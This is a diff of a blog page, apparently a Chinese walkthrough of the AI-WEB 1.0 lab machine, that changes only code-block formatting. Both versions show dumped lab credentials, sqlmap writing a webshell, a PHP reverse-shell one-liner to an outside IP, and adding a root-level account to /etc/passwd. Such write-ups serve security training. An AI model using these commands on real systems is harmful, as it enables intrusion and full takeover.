@@ -127,20 +127,18 @@
 <p><img src="/2019/11/AI-WEB 1.0/1572683771039.png" alt="1572683771039"></p>
 <p>查询systemUser库发现三个用户</p>
 <p><img src="/2019/11/AI-WEB 1.0/1572688569479.png" alt="1572688569479"></p>
-<pre><code>t00r      | FakeUserPassw0rd                    
-aiweb1pwn | MyEvilPass_f908sdaf9_sadfasf0sa
-u3er      | N0tThis0neAls0
-</code></pre><p>扫描路径m3diNf0下的文件，发现如下地址。</p>
-<pre><code>http://192.168.111.132/m3diNf0/info.php 
-</code></pre><p>找到物理地址，利用sqlmap写shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">t00r      | FakeUserPassw0rd                    </span><br><span class="line">aiweb1pwn | MyEvilPass_f908sdaf9_sadfasf0sa</span><br><span class="line">u3er      | N0tThis0neAls0</span><br></pre></td></tr></table></figure>
+<p>扫描路径m3diNf0下的文件，发现如下地址。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.111.132/m3diNf0/info.php</span><br></pre></td></tr></table></figure>
+<p>找到物理地址，利用sqlmap写shell</p>
 <p><img src="/2019/11/AI-WEB 1.0/1572705709726.png" alt="1572705709726"></p>
 <p>把给的路径加上物理地址都试一圈，发现如下地址是可写的。</p>
-<pre><code>/home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads/
-</code></pre><p>利用sqlmap上传文件的小马来上传一句话，利用蚁剑连接</p>
-<pre><code>http://192.168.111.132/se3reTdir777/uploads/a.php
-</code></pre><p>来到home目录下发现一个用户aiweb1。由于蚁剑的shell端是哑shell，反弹一个shell来提升。</p>
-<pre><code>php -r &#39;$sock=fsockopen(&quot;10.102.45.228&quot;,8888);exec(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;
-</code></pre><p>获取shell后查看发现是较高版本的内核，理论上不是内核提权。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads/</span><br></pre></td></tr></table></figure>
+<p>利用sqlmap上传文件的小马来上传一句话，利用蚁剑连接</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.111.132/se3reTdir777/uploads/a.php</span><br></pre></td></tr></table></figure>
+<p>来到home目录下发现一个用户aiweb1。由于蚁剑的shell端是哑shell，反弹一个shell来提升。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r &apos;$sock=fsockopen(&quot;10.102.45.228&quot;,8888);exec(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos;</span><br></pre></td></tr></table></figure>
+<p>获取shell后查看发现是较高版本的内核，理论上不是内核提权。</p>
 <p><img src="/2019/11/AI-WEB 1.0/image-20191102234632541.png" alt="image-20191102234632541"></p>
 <p>查看passwd文件，发现存在账号aiweb1pwn。利用之前获得的账号登陆</p>
 <p><img src="/2019/11/AI-WEB 1.0/image-20191103002714448.png" alt="image-20191103002714448"></p>
@@ -149,9 +147,8 @@ u3er      | N0tThis0neAls0
 <p><img src="/2019/11/AI-WEB 1.0/image-20191103012733428.png" alt="image-20191103012733428"></p>
 <p>这么说我这个账号还是多余的用来。</p>
 <p>利用perl来生成加密的密码，账号密码admin</p>
-<pre><code>perl -le &#39;print crypt(&quot;admin&quot;,&quot;123&quot;)&#39;  //12wGaKkN1hGuw
-admin:12wGaKkN1hGuw:0:0:User_like_root:/root:/bin/bash
-</code></pre><p>直接在蚁剑中追加一行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">perl -le &apos;print crypt(&quot;admin&quot;,&quot;123&quot;)&apos;  //12wGaKkN1hGuw</span><br><span class="line">admin:12wGaKkN1hGuw:0:0:User_like_root:/root:/bin/bash</span><br></pre></td></tr></table></figure>
+<p>直接在蚁剑中追加一行</p>
 <p><img src="/2019/11/AI-WEB 1.0/image-20191103013158615.png" alt="image-20191103013158615"></p>
 <p>sudo过来就已经是root权限</p>
 <p><img src="/2019/11/AI-WEB 1.0/image-20191103013307387.png" alt="image-20191103013307387"></p>
